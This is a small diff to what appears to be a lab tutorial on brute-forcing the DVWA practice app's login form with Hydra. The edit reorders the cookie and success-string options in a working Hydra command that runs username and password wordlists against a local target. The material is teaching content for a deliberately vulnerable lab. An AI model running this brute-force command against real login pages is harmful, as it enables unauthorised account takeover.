@@ -76,7 +76,7 @@ These first two lines serve to establish the access environment for the Hydra to
 
 Then it is just to execute the Hydra tool, passing as parameters the usernames and password (in files) that we want to test.
 
-    hydra  -L ./usernames.txt  -P ./passwords.txt -e ns  -F  -u  -t 1  -w 10  -v  -V  127.0.0.1  http-get-form  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
+    hydra  -L ./usernames.txt  -P ./passwords.txt -e ns  -F  -u  -t 1  -w 10  -v  -V  127.0.0.1  http-get-form  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=${SESSIONID}:S=Welcome to the password protected area"
 
 And the result is as follows:
 
